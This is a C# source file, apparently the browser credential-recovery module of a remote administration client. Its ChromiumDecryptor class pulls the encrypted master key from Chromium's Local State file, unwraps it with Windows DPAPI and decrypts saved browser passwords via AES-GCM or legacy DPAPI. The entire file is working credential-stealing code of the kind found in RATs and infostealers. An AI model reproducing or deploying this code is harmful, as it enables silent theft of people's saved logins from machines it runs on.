using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides methods to decrypt Chromium credentials using native .NET cryptography.
    /// </summary>
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (File.Exists(localStatePath))
                {
                    string localState = File.ReadAllText(localStatePath);

                    var subStr = localState.IndexOf("encrypted_key") + "encrypted_key".Length + 3;

                    var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));

                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
                        DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
            }
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                var cipherTextBytes = Encoding.Default.GetBytes(cipherText);

                if (cipherText.StartsWith("v10") && _key != null)
                {
                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherTextBytes, _key, 3));
                }

                return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Decryption failed: {ex.Message}");
                return string.Empty;
            }
        }

        public string Decrypt(byte[] cipherBytes)
        {
            try
            {
                // Check for v10 prefix (modern Chromium encryption)
                if (cipherBytes != null && cipherBytes.Length > 3 &&
                    cipherBytes[0] == 'v' && cipherBytes[1] == '1' && cipherBytes[2] == '0' && _key != null)
                {
                    return Encoding.UTF8.GetString(DecryptAesGcm(cipherBytes, _key, 3));
                }

                // Legacy DPAPI encryption
                if (cipherBytes != null && cipherBytes.Length > 0)
                {
                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherBytes, null, DataProtectionScope.CurrentUser));
                }

                return string.Empty;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Decryption failed: {ex.Message}");
                return string.Empty;
            }
        }

        private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            // Native .NET AES-GCM implementation (requires .NET Core 3.0+ or .NET Standard 2.1+)
            const int NONCE_BIT_SIZE = 96;
            const int TAG_BIT_SIZE = 128;

            if (key == null || key.Length != 32) // 256 bits
                throw new ArgumentException("Key needs to be 256 bit!", nameof(key));
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", nameof(message));

            try
            {
                using (var cipherStream = new MemoryStream(message))
                using (var cipherReader = new BinaryReader(cipherStream))
                {
                    // Skip the non-secret payload (e.g., "v10")
                    var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);

                    // Read the nonce (12 bytes for GCM)
                    var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);

                    // Read the ciphertext + tag
                    var cipherText = cipherReader.ReadBytes((int)(message.Length - nonSecretPayloadLength - (NONCE_BIT_SIZE / 8)));

                    // The last 16 bytes are the authentication tag
                    var cipherTextWithoutTag = new byte[cipherText.Length - (TAG_BIT_SIZE / 8)];
                    var tag = new byte[TAG_BIT_SIZE / 8];

                    Array.Copy(cipherText, 0, cipherTextWithoutTag, 0, cipherTextWithoutTag.Length);
                    Array.Copy(cipherText, cipherTextWithoutTag.Length, tag, 0, tag.Length);

                    // Decrypt using AES-GCM
                    using (var aesGcm = new AesGcm(key))
                    {
                        var plainText = new byte[cipherTextWithoutTag.Length];
                        aesGcm.Decrypt(nonce, cipherTextWithoutTag, tag, plainText);
                        return plainText;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"AES-GCM decryption failed: {ex.Message}");
                return null;
            }
        }
    }
}